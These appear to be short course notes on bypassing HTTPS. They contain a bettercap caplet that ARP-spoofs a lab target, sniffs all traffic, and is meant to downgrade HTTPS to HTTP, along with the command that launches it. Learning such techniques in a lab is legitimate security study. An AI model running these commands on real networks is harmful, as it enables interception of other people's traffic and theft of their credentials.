Bypassing HTTPS

Problem :
Data in http is sent as plain text
A mitm can read and edit requests and responses

Solution:
Use HTTPS
HTTPS is an adaptation of http
Encrypt http using TLS(transport layer security) or SSL(Secure sockets layer)

Most websites uses HTTPS
Sniffed data will be encrypted

Downgrade HTTPS to HTTP

Use custom script but change one thing here

net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.2.7
arp.spoof on
set net.sniff.local true // sniff all data even though it is local data
net.sniff on

//we will downgrade the thing from https to http

bettercap -iface eth0 -caplet /root/spoof.cap
